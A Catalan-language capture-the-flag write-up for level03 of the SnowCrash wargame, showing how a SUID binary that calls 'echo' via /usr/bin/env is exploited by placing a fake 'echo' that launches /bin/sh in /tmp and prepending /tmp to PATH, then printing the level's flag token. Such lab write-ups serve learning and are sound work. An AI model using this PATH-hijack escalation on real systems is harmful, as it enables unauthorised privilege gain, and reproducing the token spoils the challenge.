# TL;DR / TLTR
##### Llistar fitxers i directoris visibles i ocults:
```bash
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$
```
##### Observem que hi ha un fitxer anomenat level03 amb uns permisos un xic fóra del que és habitual
```bash
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
##### Entre els permisos habituals (x,w i x) percebem (s)
```text
La lletra 's' significa SUID (Set User ID), això significa que el programa/arxiu s'executa amb permisos del propietari d'aquest mateix. 
```
```bash
level03@SnowCrash:~$ whoami
level03
```
```text
Per tant hauríem de poder executar el programa perque al ser al nivell 3, l'usuari és level03 al igual que els permisos del fitxer/programa.
```
##### Executem el programa
```bash
level03@SnowCrash:~$ ./level03
Exploit me
```
##### Analitzem el programa amb el comandament 'strings' per extreure text dins de binaris
```bash
level03@SnowCrash:~$ strings level03
/lib/ld-linux.so.2
KT{K
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo Exploit me
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/home/user/level03
/usr/include/i386-linux-gnu/bits
/usr/include/i386-linux-gnu/sys
level03.c
types.h
types.h
long long int
__uid_t
envp
/home/user/level03/level03.c
long long unsigned int
setresuid
setresgid
unsigned char
GNU C 4.6.3
argc
__gid_t
short unsigned int
main
short int
argv
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
crtstuff.c
__CTOR_LIST__
__DTOR_LIST__
__JCR_LIST__
__do_global_dtors_aux
completed.6159
dtor_idx.6161
frame_dummy
__CTOR_END__
__FRAME_END__
__JCR_END__
__do_global_ctors_aux
level03.c
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
setresuid@@GLIBC_2.0
__i686.get_pc_thunk.bx
data_start
_edata
_fini
geteuid@@GLIBC_2.0
getegid@@GLIBC_2.0
__DTOR_END__
__data_start
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
setresgid@@GLIBC_2.0
_init
```
##### Observem línia prometadora de vulnerabilitat
```bash
/usr/bin/env echo Exploit me
```
```text
/usr/bin/env (És un programa que executa un altre programa utilitzant el PATH del sistema)

echo (Comanda que imprimeix text)

Exploit me (Argument)
```
##### Ens adonem que el comandament echo no té una ruta en el sistema
```text
El programa executa "echo" i no pas "/bin/echo". Per tant podríem crear un progrma maliciós anomenat "echo" i aquest ser cridat en la variable PATH de "env" (environment variables) en comptes del "echo" real
```
##### Creem el nostre propi programa maliciós anomenat "echo" en el direcori /tmp i li donem permisos
```bash
cd /tmp
echo '#!/bin/sh' > echo
echo '/bin/sh' >> echo
chmod +x echo
```
##### Afegim a la variable PATH el directori /tmp perque trobi primer el nostre progrma maliciós "echo"
```bash
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
```
##### Comprovem que així sigui
```bash
level03@SnowCrash:~$ env | grep "PATH"
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```
##### Tornem al /home del usuari level03 i executem el programa amb el mateix nom que ens havíem trobat al inici
```bash
level03@SnowCrash:~$ ./level03
```
##### Sembla que ha funcionat, mirem quin usuari som ara
```bash
$ whoami
flag03
```
##### Com que ja som usuari flag03 ja podem executar el comandament getflag i podem obtenir el token/password pel següent nivell
```bash
$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
